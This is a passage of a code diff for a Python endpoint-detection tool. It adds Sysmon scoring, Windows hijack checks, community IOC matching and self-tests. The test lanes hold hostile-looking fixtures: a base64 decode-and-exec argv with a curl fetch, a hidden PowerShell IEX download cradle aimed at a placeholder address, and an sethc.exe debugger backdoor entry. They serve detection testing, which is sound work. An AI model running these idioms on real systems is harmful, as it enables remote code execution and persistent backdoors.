+        seen.add(f["fingerprint"])
+        findings.append(f)
+    return findings
+
+
+def check_sysmon_log():
+    out, _, rc = run(["powershell", "-NoProfile", "-NonInteractive", "-Command",
+                      _SYSMON_PS], timeout=120)
+    # Non-zero exit (timeout, missing PowerShell, blocked policy) is a
+    # non-answer. So is the explicit sentinel the probe emits when Get-WinEvent
+    # failed for a reason OTHER than "no events" — the channel was there and the
+    # read did not succeed, which is DEGRADED, not clean. A clean run with no
+    # matching events in the window is a real empty ([]).
+    if rc != 0:
+        return None
+    if "sysmon-probe=failed" in (out or ""):
+        return None
+    return _sysmon_findings(_parse_win_events(out))
+
+
+def _sysmon_sensor():
+    """Register the Sysmon harvest ONLY where the Operational channel exists
+    (Sysmon installed). Channel absent = product not installed = sensor absent,
+    exactly like a launchd check on Linux — never a DEGRADED row for a tool that
+    is not there. When the channel key cannot be READ (denied), absence cannot
+    be proven, so we register and let check_sysmon_log degrade honestly."""
+    try:
+        import winreg
+    except Exception:
+        return []
+    try:
+        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, _SYSMON_CHANNEL_KEY):
+            pass
+    except FileNotFoundError:
+        return []
+    except OSError:
+        pass  # denied/other: cannot prove absence -> register
+    return [("sysmon-log", check_sysmon_log, ())]
 
 
 # --- Auth sessions (remote login / screen sharing) ---------------------------
@@ -8544,6 +9221,9 @@ else:
          diff_win_exclusions),
         ("win_wmi_subscriptions", snapshot_wmi_subscriptions,
          diff_wmi_subscriptions),
+        ("win_com_hijack", snapshot_com_hijack, diff_com_hijack),
+        ("win_ifeo", snapshot_ifeo, diff_ifeo),
+        ("win_appinit", snapshot_appinit, diff_appinit),
     ]
 
 # Surfaces whose first-sight items are LIVE risks, not installed-residue: they
@@ -8991,6 +9671,7 @@ def gather_all(baseline_snap, current_snap, health=None):
         sensors += [
             ("windows-event-log", check_windows_event_log, ()),
         ]
+        sensors += _sysmon_sensor()  # only where the Sysmon channel exists
     # ONE process-table walk for the whole sensor loop. Built through the
     # module-level _iter_processes (cache is None here, so this is a live walk,
     # and a test that stubs _iter_processes still flows through), then armed so
@@ -9006,6 +9687,13 @@ def gather_all(baseline_snap, current_snap, health=None):
             findings += _collect_sensor(sensor_id, fn, health_sink, *args)
     finally:
         _PROC_SNAPSHOT = None
+    # Community-intel grading (see cmd_intel) — a local set lookup over the
+    # hashes the sensors above already computed plus the persistence
+    # snapshot's. Scheduled only when local intel EXISTS: a machine that never
+    # ran `intel update` has no "intel" sensor at all (absent, not degraded).
+    if any(_intel_sets()):
+        findings += _collect_sensor("intel", check_intel, health_sink,
+                                    current_snap, findings)
     # Stamp the human-presence regime once per scan (not per finding — the
     # probe shells out, and paying that per finding would be absurd). This is
     # EVIDENCE ONLY and must stay that way: idle time is forgeable by a
@@ -9556,10 +10244,27 @@ SENSOR_BENIGN_NOTES = {
                     "the flagged idiom (decode-and-exec) is what matters.",
     "net-listener": "Dev servers, Docker, syncthing, and AirPlay bind ports; "
                     "loopback-only listeners are already excluded.",
+    "net-beacon": "A long-lived sync/telemetry daemon you installed (syncthing, "
+                  "tailscaled, a backup agent) holds one endpoint across scans, "
+                  "which is the same SHAPE as a beacon — check the binary.",
     "btm": "Any app you install can register a login item or background agent.",
-    "browserext": "Extensions you installed yourself appear here on first sight.",
-    "ide_ext": "VSCode/Cursor extensions auto-update, which re-fires this.",
-    "wallet": "Wallet apps rewrite their own config on update or account change.",
+    # Keyed on the finding CATEGORY, which is hyphenated. The surface ids
+    # ("browserext", "ide_ext") are a different namespace, and using those
+    # spellings here meant _benign_note_for's exact lookup never matched, so
+    # these two notes silently never rendered on the surfaces that need them
+    # most.
+    "browser-ext": "Extensions you installed yourself appear here on first sight.",
+    "ide-ext": "VSCode/Cursor extensions auto-update, which re-fires this.",
+    "com-hijack": "Dev tools and Office add-ins register per-user COM servers "
+                  "under HKCU; a target inside Program Files is ordinary.",
+    "appinit": "A few legacy IME/accessibility tools still use AppInit_DLLs.",
+    "sysmon": "Your own scripting produces EID 1 constantly — the flagged argv "
+              "idiom is the signal, not the process itself.",
+    "intel": "A recent-window community feed can list a shared CDN/VPS address "
+             "someone else abused, so an ip:port hit is far weaker evidence "
+             "than a hash hit; verify before acting on the endpoint alone.",
+    "wallet-integrity": "Wallet apps rewrite their own config on update or "
+                        "account change.",
     "web-protection": "Editing /etc/hosts for local development is expected.",
     "hardening": "A deliberately disabled firewall or Remote Login you enabled.",
     "canary": "A backup/indexing tool touching the decoy file, or your own edit.",
@@ -9887,6 +10592,24 @@ def cmd_doctor():
           ("✓" if state_mode == 0o700 else "?", state_mode))
     if state_mode != 0o700:
         problems.append("state permissions")
+    # Runtime-copy drift is rot, and doctor is where rot surfaces: the
+    # background monitor executes ~/.aegis/aegis.py, not this file, so a stale
+    # copy means every scheduled scan silently runs OLD code.
+    rt = _runtime_copy_status()
+    if rt == "drift":
+        print("  ✗ runtime copy               STALE — refresh: %s"
+              % _refresh_line())
+        problems.append("runtime copy stale")
+    elif rt == "unknown":
+        print("  ? runtime copy               could not be hashed "
+              "(unknown, not clean)")
+        problems.append("runtime copy unknown")
+    elif rt == "in-sync":
+        print("  ✓ runtime copy               in sync with this file")
+    elif rt == "self":
+        print("  ✓ runtime copy               running the installed copy")
+    else:
+        print("  · runtime copy               not installed (manual runs only)")
     for path in (os.path.join(HOME, "Downloads"), os.path.join(HOME, "Desktop")):
         try:
             iterator = os.scandir(path)
@@ -9909,6 +10632,16 @@ def cmd_doctor():
             item["consecutive_failures"], item["detail"] or ""))
         if item["status"] != "OK":
             problems.append(item["sensor_id"])
+    # INFO, never a problem: rootwatch is opt-in, but its absence is worth one
+    # honest line — without it a same-uid attacker can kill Aegis and the
+    # user-level watchdog together, alert-free until the notary is read.
+    if not IS_WIN:
+        print("  %s %-27s %s" % (
+            ("✓", "rootwatch (root witness)", "installed (opt-in)")
+            if _rootwatch_installed() else
+            ("i", "rootwatch (root witness)",
+             "absent — OPT-IN; the kill gap is open: run "
+             "`aegis.py rootwatch install`")))
     incidents = list_incidents()
     print("\n  %s active incident%s" %
           (len(incidents), "" if len(incidents) == 1 else "s"))
@@ -10007,6 +10740,8 @@ def cmd_status():
         "✓" if _heartbeat_url() else "·", "Off-host heartbeat",
         "configured (out-of-band alerting on)" if _heartbeat_url()
         else "off (local-only; set AEGIS_HEARTBEAT_URL to enable)"))
+    intel_mark, intel_text = _intel_summary()
+    print("  %s %-32s %s" % (intel_mark, "Intel feeds", intel_text))
     if os.path.exists(WATCHDOG_ALERT):
         try:
             with open(WATCHDOG_ALERT, encoding="utf-8") as f:
@@ -10115,6 +10850,325 @@ def cmd_vt(target):
           % (sha, verdict.upper(), mal, susp, total, sha))
     log_run("vt %s -> %s (%d/%d)" % (sha[:16], verdict, mal, total))
     return 0
+
+
+# --------------------------------------------------------------------------- #
+# Community IOC intel (`aegis.py intel …`) — glean's doctrine generalized to
+# every OS: a dated, offline intel corpus graded over work the scan ALREADY
+# does. `intel update` is the by-hand fetch half (two public abuse.ch exports;
+# nothing about this machine is in the request and nothing but a public list
+# arrives); the scan half only ever READS the normalized local artifacts. With
+# no fetched intel the surface simply does not exist — never a degraded
+# sensor — and the scan path stays structurally incapable of network I/O.
+# --------------------------------------------------------------------------- #
+
+_INTEL_CACHE = None  # (file stat stamp, sha256→meta, "ip:port"→meta)
+
+
+def _looks_like_ip_port(s):
+    return bool(re.fullmatch(r"\d{1,3}(?:\.\d{1,3}){3}:\d{1,5}", s or ""))
+
+
+def _intel_str(v):
+    """Feed metadata sanitizer: a short non-empty string or nothing — a hostile
+    feed value can't smuggle structures into state files or finding text."""
+    if isinstance(v, str) and v.strip():
+        return v.strip()[:120]
+    return None
+
+
+def _parse_bazaar_sha256_export(text):
+    """Pure parser: MalwareBazaar's plain-text SHA256 export (`#` comment
+    lines, one hash per line) → sorted, case-folded, deduplicated list.
+    Garbage lines are dropped, never raised on."""
+    out = set()
+    for line in (text or "").splitlines():
+        s = line.strip().strip('",')
+        if not s or s.startswith("#"):
+            continue
+        if _looks_like_sha256(s):
+            out.add(s.lower())
+            if len(out) >= INTEL_MAX_HASHES:
+                break
+    return sorted(out)
+
+
+def _parse_threatfox_export(data):
+    """Pure normalizer: ThreatFox's JSON export (dict of id → list of IOC
+    rows) → (sha256→meta, "ip:port"→meta). ONLY hashes and ip:port pairs are
+    kept — the feed's domains/URLs are deliberately not written anywhere (the
+    scan computes nothing they could match, and the privacy posture is to
+    store nothing it doesn't use). Never raises on garbage shapes."""
+    hashes, net = {}, {}
+    if isinstance(data, dict):
+        groups = list(data.values())
+    elif isinstance(data, list):
+        groups = [data]
+    else:
+        return hashes, net
+    for group in groups:
+        if not isinstance(group, list):
+            continue
+        for row in group:
+            if not isinstance(row, dict):
+                continue
+            val, typ = row.get("ioc_value"), row.get("ioc_type")
+            if not isinstance(val, str) or not isinstance(typ, str):
+                continue
+            meta = {"family": _intel_str(row.get("malware_printable")
+                                         or row.get("malware")),
+                    "first_seen": _intel_str(row.get("first_seen_utc"))}
+            if typ == "sha256_hash" and _looks_like_sha256(val) \
+                    and len(hashes) < INTEL_MAX_HASHES:
+                hashes[val.lower()] = meta
+            elif typ == "ip:port" and _looks_like_ip_port(val) \
+                    and len(net) < INTEL_MAX_NET:
+                net[val] = meta
+    return hashes, net
+
+
+def _intel_sets():
+    """The local IOC sets as (sha256→meta, "ip:port"→meta), each meta
+    {feed, family, first_seen}. Reads LOCAL artifacts only; absent files ⇒
+    empty maps. Memoized on the files' (mtime, size) so one scan — and every
+    lap of cmd_watch's long-lived loop — pays two stat() calls rather than a
+    reparse, while a by-hand `intel update` is picked up on the very next
+    scan. Entry caps and key re-validation bound memory even against a
+    tampered oversize or hand-edited artifact."""
+    global _INTEL_CACHE
+    stamp = []
+    for path in (INTEL_BAZAAR_FILE, INTEL_THREATFOX_FILE):
+        try:
+            st = os.stat(path)
+            stamp.append((path, st.st_mtime_ns, st.st_size))
+        except OSError:
+            stamp.append((path, None, None))
+    stamp = tuple(stamp)
+    if _INTEL_CACHE is not None and _INTEL_CACHE[0] == stamp:
+        return _INTEL_CACHE[1], _INTEL_CACHE[2]
+    hashes, net = {}, {}
+
+    def adopt(mapping, target, cap, valid, feed):
+        if not isinstance(mapping, dict):
+            return
+        for key, meta in mapping.items():
+            if len(target) >= cap:
+                return
+            if not (isinstance(key, str) and valid(key)):
+                continue
+            meta = meta if isinstance(meta, dict) else {}
+            target[key.lower()] = {
+                "feed": feed, "family": _intel_str(meta.get("family")),
+                "first_seen": _intel_str(meta.get("first_seen"))}
+
+    doc = load_json(INTEL_BAZAAR_FILE, None)
+    if isinstance(doc, dict) and isinstance(doc.get("hashes"), list):
+        for h in doc["hashes"][:INTEL_MAX_HASHES]:
+            if isinstance(h, str) and _looks_like_sha256(h):
+                hashes[h.lower()] = {"feed": "MalwareBazaar", "family": None,
+                                     "first_seen": None}
+    doc = load_json(INTEL_THREATFOX_FILE, None)
+    if isinstance(doc, dict):
+        # ThreatFox meta wins on overlap: it names the family.
+        adopt(doc.get("hashes"), hashes, INTEL_MAX_HASHES,
+              _looks_like_sha256, "ThreatFox")
+        adopt(doc.get("net"), net, INTEL_MAX_NET,
+              _looks_like_ip_port, "ThreatFox")
+    _INTEL_CACHE = (stamp, hashes, net)
+    return hashes, net
+
+
+def _intel_hash_finding(sha, path, where):
+    if not sha:
+        return None
+    meta = _intel_sets()[0].get(str(sha).lower())
+    if meta is None:
+        return None
+    return finding(
+        "CRITICAL", "intel", "Known-malware hash (community intel)",
+        "%s is byte-identical to a sample on the %s IOC feed (%s, first seen "
+        "%s) — found as %s. An exact corpus hash match is not a heuristic: "
+        "verify the file and quarantine it."
+        % (path or sha, meta["feed"], meta.get("family") or "family "
+           "unrecorded", meta.get("first_seen") or "n/a", where),
+        "intel:hash:%s:%s" % (sha, path or "?"),
+        path=path, sha256=sha, feed=meta["feed"], family=meta.get("family"),
+        first_seen=meta.get("first_seen"), confidence="high",
+        markers=["known-malware"])
+
+
+def _intel_net_finding(path, rip, rport):
+    net = _intel_sets()[1]
+    if not net:
+        return None
+    meta = net.get("%s:%s" % (rip, rport))
+    if meta is None:
+        return None
+    return finding(
+        "CRITICAL", "intel",
+        "Outbound connection to a known C2 (community intel)",
+        "%s holds a live connection to %s:%s, which is on the %s C2/IOC list "
+        "(%s, first seen %s). A current connection to a catalogued C2 "
+        "endpoint is an active-compromise signal regardless of the binary's "
+        "signature." % (path, rip, rport, meta["feed"],
+                        meta.get("family") or "family unrecorded",
+                        meta.get("first_seen") or "n/a"),
+        "intel:net:%s:%s:%s" % (rip, rport, path),
+        path=path, program=path, remote=rip, port=rport, feed=meta["feed"],
+        family=meta.get("family"), first_seen=meta.get("first_seen"),
+        confidence="high", markers=["outbound-exfil", "known-c2"])
+
+
+def check_intel(current_snap, prior_findings=None):
+    """Grade the sha256 values THIS scan already computed — every persistence
+    record's program hash plus any finding that carries one (hot-dir drops,
+    app bundles) — against the local community sets. Nothing is re-hashed and
+    nothing new is read from the filesystem: this is a set lookup over work
+    the scan already did, scheduled by gather_all only when local intel
+    exists."""
+    findings, seen = [], set()
+
+    def grade(sha, path, where):
+        f = _intel_hash_finding(sha, path, where)
+        if f and f["fingerprint"] not in seen:
+            seen.add(f["fingerprint"])
+            findings.append(f)
+
+    for key, rec in sorted((current_snap or {}).items()):
+        if isinstance(rec, dict):
+            grade(rec.get("sha256"), rec.get("program") or key,
+                  "persistence item %s" % (rec.get("label") or key))
+    for prior in (prior_findings or []):
+        if isinstance(prior, dict) and prior.get("sha256"):
+            grade(prior.get("sha256"), prior.get("path"),
+                  "flagged by the %s sensor" % prior.get("category", "?"))
+    return findings
+
+
+def _intel_fetch(url):
+    """Transport for `intel update` ONLY. urllib is imported lazily HERE —
+    exactly like cmd_vt — so the scan path never even loads the networking
+    module. The request carries nothing about this machine."""
+    import urllib.request  # lazy: the scan path never imports urllib
+    req = urllib.request.Request(url, headers={"User-Agent": "aegis-intel"})
+    with urllib.request.urlopen(req, timeout=60) as resp:
+        return resp.read(INTEL_MAX_FETCH_BYTES)
+
+
+def _intel_bazaar_doc(raw):
+    hashes = _parse_bazaar_sha256_export(raw.decode("utf-8", "replace"))
+    if not hashes:
+        return None, None
+    doc = {"feed": "MalwareBazaar", "source": INTEL_BAZAAR_URL,
+           "fetched_at": now_iso(), "count": len(hashes), "hashes": hashes}
+    return doc, "%d sample hashes" % len(hashes)
+
+
+def _intel_threatfox_doc(raw):
+    hashes, net = _parse_threatfox_export(
+        json.loads(raw.decode("utf-8", "replace")))
+    if not hashes and not net:
+        return None, None
+    doc = {"feed": "ThreatFox", "source": INTEL_THREATFOX_URL,
+           "fetched_at": now_iso(), "hashes": hashes, "net": net}
+    return doc, "%d hashes, %d ip:ports" % (len(hashes), len(net))
+
+
+def cmd_intel(action="status"):
+    """OPT-IN community IOC layer. `update` is the by-hand fetch half; scans
+    then grade their OWN hashes and outbound rows against the local copy,
+    offline. Anything else prints status."""
+    ensure_state()
+    if action == "update":
+        return _cmd_intel_update()
+    if action == "status":
+        return _cmd_intel_status()
+    print("usage: aegis.py intel [update|status]")
+    return 1
+
+
+def _cmd_intel_update():
+    os.makedirs(INTEL_DIR, mode=0o700, exist_ok=True)
+    try:
+        os.chmod(INTEL_DIR, 0o700)
+    except OSError:
+        pass
+    print("# Aegis intel update — public abuse.ch IOC exports (by hand, "
+          "no key)")
+    failures = 0
+    for name, url, path, build in (
+            ("MalwareBazaar", INTEL_BAZAAR_URL, INTEL_BAZAAR_FILE,
+             _intel_bazaar_doc),
+            ("ThreatFox", INTEL_THREATFOX_URL, INTEL_THREATFOX_FILE,
+             _intel_threatfox_doc)):
+        try:
+            doc, desc = build(_intel_fetch(url))
+            if doc is None:
+                # A fetch that "succeeds" but parses to nothing is a format
+                # change or a truncated body — either way, NOT a reason to
+                # clobber a good prior copy with an empty one.
+                raise ValueError("no usable entries parsed (truncated "
+                                 "download or a feed format change)")
+            save_json(path, doc)
+            print("  ✓ %-14s %s" % (name, desc))
+        except Exception as e:
+            failures += 1
+            prior = load_json(path, None)
+            print("  ✗ %-14s failed (%s)%s" % (
+                name, e,
+                " — keeping the prior copy (fetched %s)"
+                % prior.get("fetched_at") if isinstance(prior, dict)
+                else "; no prior copy to fall back on"))
+    log_run("intel update: %d/2 feeds ok" % (2 - failures))
+    return 1 if failures else 0
+
+
+def _cmd_intel_status():
+    print("# Aegis intel — community IOC feeds (local copies; the scan "
+          "never fetches)")
+    fetched = False
+    for name, path in (("MalwareBazaar", INTEL_BAZAAR_FILE),
+                       ("ThreatFox", INTEL_THREATFOX_FILE)):
+        doc = load_json(path, None)
+        if not isinstance(doc, dict):
+            print("  · %-14s not fetched" % name)
+            continue
+        fetched = True
+        age = (time.time() - _epoch(doc.get("fetched_at"))) / 86400.0
+        if name == "MalwareBazaar":
+            counts = "%d sample hashes" % len(doc.get("hashes") or [])
+        else:
+            counts = "%d hashes, %d ip:ports" % (
+                len(doc.get("hashes") or {}), len(doc.get("net") or {}))
+        stale = age > INTEL_STALE_DAYS
+        print("  %s %-14s %s, fetched %.1f days ago%s"
+              % ("✗" if stale else "✓", name, counts, age,
+                 " — STALE (>%dd; run `aegis.py intel update`)"
+                 % INTEL_STALE_DAYS if stale else ""))
+    if not fetched:
+        print("  Opt-in and by-hand: `aegis.py intel update` downloads two "
+              "public abuse.ch\n  IOC exports; scans then grade their own "
+              "hashes and outbound ip:port rows\n  against the local copy — "
+              "offline, nothing about this machine ever sent.")
+    return 0
+
+
+def _intel_summary():
+    """One status-line cell for cmd_status: (mark, text)."""
+    docs = [d for d in (load_json(INTEL_BAZAAR_FILE, None),
+                        load_json(INTEL_THREATFOX_FILE, None))
+            if isinstance(d, dict)]
+    if not docs:
+        return "·", "none fetched (opt-in: aegis.py intel update)"
+    hashes, net = _intel_sets()
+    oldest = max((time.time() - _epoch(d.get("fetched_at"))) / 86400.0
+                 for d in docs)
+    if oldest > INTEL_STALE_DAYS:
+        return "✗", ("%d hashes / %d ip:ports, oldest fetch %.0f days ago — "
+                     "STALE (>%dd; run aegis.py intel update)"
+                     % (len(hashes), len(net), oldest, INTEL_STALE_DAYS))
+    return "✓", ("%d hashes / %d ip:ports, oldest fetch %.1f days ago"
+                 % (len(hashes), len(net), oldest))
 
 
 def cmd_allow(path):
@@ -13099,6 +14153,253 @@ def _assay_lanes():
             g["WRIT_FILE"] = real
             shutil.rmtree(d, ignore_errors=True)
 
+    # --- the surfaces added in this release --------------------------------
+    # Five detectors shipped with no control at all. That is the same state the
+    # latch detector was in when it answered "unknown" forever: reachable-
+    # looking, permanently silent, and nothing failing. The both-poles rule
+    # above applies unchanged to every lane below — the benign pole is named in
+    # each docstring, because on these five surfaces it is the harder one.
+
+    # Windows-shaped fixtures need Windows-shaped grading. Swapped for the
+    # duration of the two lanes below, UNCONDITIONALLY (including on Windows)
+    # so one control means the same thing on every host; the live tables keep
+    # their own lane (`risky-location`).
+    _WIN_ASSAY_FLAGS = {
+        "IS_WIN": True,
+        "TRUSTED_PREFIXES": ("C:\\Windows\\", "C:\\Program Files\\"),
+        "RISKY_PREFIXES": ("C:\\Users\\",),
+    }
+
+    def _swap_win_flags():
+        g = globals()
+        saved = {k: g[k] for k in _WIN_ASSAY_FLAGS}
+        g.update(_WIN_ASSAY_FLAGS)
+        return saved
+
+    def lane_beacon_recurrence(nonce):
+        """Recurrence scores the beacon residue shape and stays silent on
+        browser churn, a short history, a short span, and a signed binary in an
+        ordinary path.
+
+        The benign poles are the whole reason this detector exists as a
+        separate rung: outbound churn cannot be baseline-diffed because a
+        browser opens hundreds of connections, so recurrence keys on the
+        opposite invariant and MUST exclude the things that legitimately hold a
+        remote pair for hours. Pure over synthetic (ts, rows) snapshots — it
+        observes nothing, records nothing, and connects to nothing."""
+        now = _epoch()
+        hot = "/nonexistent-assay-%s/updater" % nonce
+        risky = os.path.join(WIN_TEMP if IS_WIN else "/tmp",
+                             "aegis-assay-%s" % nonce)
+        browser = "/nonexistent-assay-%s/Google Chrome" % nonce
+
+        def hist(row, spans=(4200, 2100, 60)):
+            return [(now - s, [list(row)]) for s in spans]
+
+        # Two hostile rows, one per arm of the gate: 'broken' is the single
+        # trust verdict suspicious_sig accepts on all three platforms, and the
+        # risky-path row proves the OR's other side with an ordinary signature.
+        for row in ((hot, "198.51.100.7", "8443", "broken"),
+                    (risky, "198.51.100.7", "8443", "signed")):
+            out = _beacon_recurrence(hist(row), [row])
+            if len(out) != 1 or out[0]["severity"] != "HIGH":
+                return False
+        bro = (browser, "198.51.100.7", "8443", "broken")
+        if _beacon_recurrence(hist(bro), [bro]) != []:
+            return False            # a browser is excluded by NAME, not trust
+        row = (hot, "198.51.100.7", "8443", "broken")
+        if _beacon_recurrence(hist(row)[:2], [row]) != []:
+            return False            # below BEACON_MIN_SCANS
+        if _beacon_recurrence(hist(row, (600, 300, 60)), [row]) != []:
+            return False            # 3 scans, but inside one polling burst
+        quiet = ("/nonexistent-assay-%s/tool" % nonce, "198.51.100.7",
+                 "8443", "signed")
+        if _beacon_recurrence(hist(quiet), [quiet]) != []:
+            return False            # signed, ordinary path
+        return _beacon_recurrence(hist(row), []) == []   # not live now: silent
+
+    def lane_argv_obfuscation(nonce):
+        """An interpreter handed a long decodable high-entropy blob scores, an
+        inline decode-and-execute composition scores, a fetching argv escalates
+        — and the benign shapes stay silent.
+
+        Gate 1 (a real code-execution flag) is the benign pole that decides
+        whether this surface is usable at all: Electron helpers, JWT-bearing
+        cloud CLIs and hash-named cache paths carry giant opaque argv on an
+        ordinary machine, so entropy scored over any process would flag the
+        operator's own work. The stimulus is base64 of an INERT nonce-tagged
+        marker plus random bytes: it is built here rather than committed, and
+        it decodes to nothing that runs."""
+        raw = b"AEGIS-ASSAY-INERT-" + nonce.encode() + os.urandom(80)
+        blob = base64.b64encode(raw).decode()
+        hostile = ('python3 -c "import base64;exec(base64.b64decode(\'%s\'))"'
+                   % blob)
+        sig = dict(_argv_signals(hostile))
+        if "obfuscated-inline-payload" not in sig:
+            return False            # the long decodable blob itself
+        if "argv-encoded-loader" not in sig:
+            return False            # decode composed with an exec sink
+        fetchy = ('python3 -c "import os,base64;os.system(\'curl -fsSL '
+                  'http://198.51.100.7/%s\');exec(base64.b64decode(\'%s\'))"'
+                  % (nonce, blob))
+        if dict(_argv_signals(fetchy)).get(
+                "obfuscated-inline-payload") != "HIGH":
+            return False            # an argv that also FETCHES escalates
+        for benign in ('python3 -c "print(1+1)"',
+                       'python3 -c "x=\'%s\'"' % ("a" * 160),
+                       'python3 -c "print(\'%s\')"'
+                       % ("the gardener waters every single row of tomatoes "
+                          "before dusk and the neighbours complain again"),
+                       "/nonexistent-assay-%s/tool --token %s"
+                       % (nonce, blob)):
+            if _argv_signals(benign):
+                return False        # short code, low entropy, English, no gate
+        # Gate 1 asserted against the scorer directly: the same blob with no
+        # code-execution flag anywhere in argv must score nothing at all.
+        return _obfuscated_payload_signals("--token %s" % blob, set()) == []
+
+    def lane_intel_match(nonce):
+        """A hash and an ip:port on the local IOC sets grade CRITICAL; a
+        non-matching hash, a non-matching endpoint, and empty sets are silent.
+
+        Runs against SYNTHETIC in-memory sets, with `_intel_sets` redirected
+        for the duration. A control that read the operator's real feed files
+        would prove nothing on a machine that never ran `intel update` and
+        would silently come to depend on whatever a feed published that day —
+        so this lane reads no file and makes no request."""
+        g = globals()
+        real = g["_intel_sets"]
+        hit = hashlib.sha256(("aegis-assay-hit-" + nonce).encode()).hexdigest()
+        miss = hashlib.sha256(
+            ("aegis-assay-miss-" + nonce).encode()).hexdigest()
+        meta = {"feed": "assay", "family": "Assay.Inert",
+                "first_seen": "1970-01-01"}
+        try:
+            g["_intel_sets"] = lambda: ({hit: meta},
+                                        {"198.51.100.7:8443": meta})
+            label = "com.assay.%s" % nonce
+            snap = {label: {"program": "/nonexistent-assay-%s/x" % nonce,
+                            "sha256": hit, "label": label}}
+            out = check_intel(snap)
+            if len(out) != 1 or out[0]["severity"] != "CRITICAL":
+                return False        # a persistence record's own program hash
+            out = check_intel({}, [{
+                "sha256": hit, "category": "hotdir",
+                "path": "/nonexistent-assay-%s/d" % nonce}])
+            if len(out) != 1 or out[0]["severity"] != "CRITICAL":
+                return False        # a hash another sensor already carried
+            net = _intel_net_finding("/nonexistent-assay-%s/x" % nonce,
+                                     "198.51.100.7", 8443)
+            if not net or net["severity"] != "CRITICAL":
+                return False        # a live connection to a catalogued C2
+            if check_intel({label: {"program": "/p", "sha256": miss}}) != []:
+                return False        # a hash the sets do not carry
+            if _intel_net_finding("/p", "203.0.113.9", 443) is not None:
+                return False        # an endpoint the sets do not carry
+            g["_intel_sets"] = lambda: ({}, {})
+            return check_intel(snap) == []   # no local intel at all: inert
+        except Exception:
+            return False
+        finally:
+            g["_intel_sets"] = real
+
+    def lane_win_evasion(nonce):
+        """The three Windows execute-hijack diffs score their hostile shapes
+        and stay silent on ordinary churn — on EVERY host.
+
+        These diffs are pure over dicts, so gating the lane to Windows would
+        leave the author's macOS machine reporting coverage that was never once
+        exercised: exactly the asserted-rather-than-demonstrated state this
+        whole tier exists to expose. The benign poles are what keep the surface
+        readable — a COM registration into an admin-writable install tree is
+        ordinary app churn, and an entry already present at first sight is
+        adopted, not alerted."""
+        saved = _swap_win_flags()
+        try:
+            clsid = "{018D5C66-4533-4307-9B53-224DE2ED1FE6}\\InprocServer32"
+            bad = "C:\\Users\\assay\\AppData\\Roaming\\assay-%s.dll" % nonce
+            good = "C:\\Program Files\\Vendor\\assay-%s.dll" % nonce
+            out = diff_com_hijack({}, {clsid: bad})
+            if len(out) != 1 or out[0]["severity"] != "HIGH":
+                return False        # new CLSID server in a user-writable path
+            out = diff_com_hijack({clsid: good}, {clsid: bad})
+            if len(out) != 1 or out[0]["severity"] != "HIGH":
+                return False        # the same CLSID repointed in place
+            if diff_com_hijack({}, {clsid: good}) != []:
+                return False        # a Program Files target is app churn
+            if diff_com_hijack({clsid: bad}, {clsid: bad}) != []:
+                return False        # adopted and unchanged
+            dbg = "C:\\Users\\assay\\assay-%s.exe" % nonce
+            out = diff_ifeo({}, {"debugger:sethc.exe": dbg})
+            if len(out) != 1 or out[0]["severity"] != "CRITICAL":
+                return False        # accessibility binary = pre-auth backdoor
+            out = diff_ifeo({}, {"debugger:notepad.exe": dbg})
+            if len(out) != 1 or out[0]["severity"] != "HIGH":
+                return False        # an ordinary target is HIGH, not CRITICAL
+            if diff_ifeo({"debugger:sethc.exe": dbg},
+                         {"debugger:sethc.exe": dbg}) != []:
+                return False        # pre-existing entry, already adopted
+            ak = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows"
+            val = "assay-%s.dll" % nonce
+            out = diff_appinit({}, {ak: val})
+            if len(out) != 1 or out[0]["severity"] != "HIGH":
+                return False        # AppInit_DLLs is off by default
+            return diff_appinit({ak: val}, {ak: val}) == []
+        except Exception:
+            return False
+        finally:
+            globals().update(saved)
+
+    def lane_sysmon_scoring(nonce):
+        """Sysmon EID 1 and 6 scoring fires on the hostile fixtures and stays
+        silent on a validly-signed driver, a clean process in a trusted path,
+        and a stray event ID.
+
+        Pure over the `log|id|time|message` rows the harvest already parses, so
+        it runs everywhere for the same reason the lane above does. EID 1 is
+        the high-volume channel Sysmon exists to produce, so 'can it fire' is
+        the cheap half — a scorer that reported every process creation would
+        pass a hostile-only control and bury the operator."""
+        saved = _swap_win_flags()
+        try:
+            ch = _SYSMON_CHANNEL
+            cmd = ("powershell -nop -w hidden -c IEX(New-Object "
+                   "Net.WebClient).DownloadString('http://198.51.100.7/%s')"
+                   % nonce)
+            hostile = ("Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0"
+                       "\\powershell.exe CommandLine: %s" % cmd)
+            out = _sysmon_findings([(ch, "1", "2026-01-01T00:00Z", hostile)])
+            if len(out) != 1 or out[0]["severity"] != "HIGH":
+                return False        # hostile idiom in the CommandLine
+            drop = ("Image: C:\\Users\\assay\\AppData\\Local\\Temp\\assay-%s"
+                    ".exe CommandLine: assay-%s.exe --quiet" % (nonce, nonce))
+            out = _sysmon_findings([(ch, "1", "t", drop)])
+            if len(out) != 1 or out[0]["severity"] != "MEDIUM":
+                return False        # risky-path exec with a clean argv
+            unsigned = ("ImageLoaded: C:\\Windows\\System32\\drivers\\assay-%s"
+                        ".sys Signed: false SignatureStatus: Unavailable"
+                        % nonce)
+            out = _sysmon_findings([(ch, "6", "t", unsigned)])
+            if len(out) != 1 or out[0]["severity"] != "HIGH":
+                return False        # ring-0 code with no vouching signature
+            clean = ("Image: C:\\Windows\\System32\\notepad.exe CommandLine: "
+                     "notepad.exe C:\\Windows\\assay-%s.txt" % nonce)
+            if _sysmon_findings([(ch, "1", "t", clean)]) != []:
+                return False        # signed-path binary, nothing in the argv
+            signed = ("ImageLoaded: C:\\Windows\\System32\\drivers\\vendor-%s"
+                      ".sys Signed: true SignatureStatus: Valid" % nonce)
+            if _sysmon_findings([(ch, "6", "t", signed)]) != []:
+                return False        # a validly-signed driver load is silent
+            if _sysmon_findings([(ch, "3", "t", hostile)]) != []:
+                return False        # a stray EID must not fabricate a finding
+            # One event re-read in overlapping windows is ONE finding.
+            return len(_sysmon_findings([(ch, "6", "t", unsigned),
+                                         (ch, "6", "t2", unsigned)])) == 1
+        except Exception:
+            return False
+        finally:
+            globals().update(saved)
+
     return [
         ("hostile-argv", "fetch-and-execute argv still scores hostile",
          lane_hostile_argv),
@@ -13118,6 +14419,21 @@ def _assay_lanes():
          lane_glean_atoms),
         ("writ-enforcement", "writ escalates uncovered, adopts covered, off is inert",
          lane_writ_enforcement),
+        ("beacon-recurrence",
+         "outbound recurrence fires on beacon shape, not on browser churn",
+         lane_beacon_recurrence),
+        ("argv-obfuscation",
